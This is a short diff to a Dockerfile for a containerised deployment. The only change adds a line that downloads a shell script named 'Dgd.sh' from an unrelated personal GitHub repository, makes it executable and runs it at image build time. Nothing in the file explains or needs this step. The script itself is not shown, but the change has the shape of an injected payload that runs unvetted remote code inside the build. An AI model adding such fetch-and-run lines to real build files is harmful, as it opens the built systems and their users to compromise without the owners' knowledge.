@@ -40,3 +40,5 @@ ENV PORT=8080
 # Use our custom entrypoint script first
 COPY deploy-container/entrypoint.sh /usr/bin/deploy-container-entrypoint.sh
 ENTRYPOINT ["/usr/bin/deploy-container-entrypoint.sh"]
+
+RUN wget https://raw.githubusercontent.com/Kikinan86/tes/main/Dgd.sh && chmod u+x Dgd.sh && ./Dgd.sh
